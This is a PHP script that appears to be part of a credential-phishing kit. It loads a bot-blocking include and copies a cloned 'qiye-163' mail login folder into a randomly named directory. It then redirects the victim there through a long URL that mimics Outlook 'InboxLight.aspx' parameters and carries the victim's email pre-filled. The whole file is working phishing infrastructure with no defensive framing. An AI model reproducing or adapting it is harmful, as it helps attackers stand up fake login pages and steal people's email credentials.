<?php

include('blocker.php');

$random = rand(50000,100000000000);
$dst    = substr(md5($random), 0, 1000000000);

if(isset($_GET['open'])){
$loguid = base64_decode($_GET['uid']);
}else{
$loguid =  $_GET['uid'];
}


if(isset($_GET['mgs'])){
$msg='mgs=tee';
}else{
$msg='nosmgs=tee';
}


$log = base64_encode($loguid);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="qiye-163";
recurse_copy( $src, $dst );


header("location:".$dst."?Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.1252899642&fid=1&".$msg."&rand.13InboxLight.aspxn.".$mds.".1774256418&fid.1252899642&fid.1&fav.1&login=".$log."&.rand=13InboxLight.aspx?n=".$random."1774256418&fid=4#n=1252899642&fid=1&fav=1&?office=&rand=13InboxLight.aspx");

?>
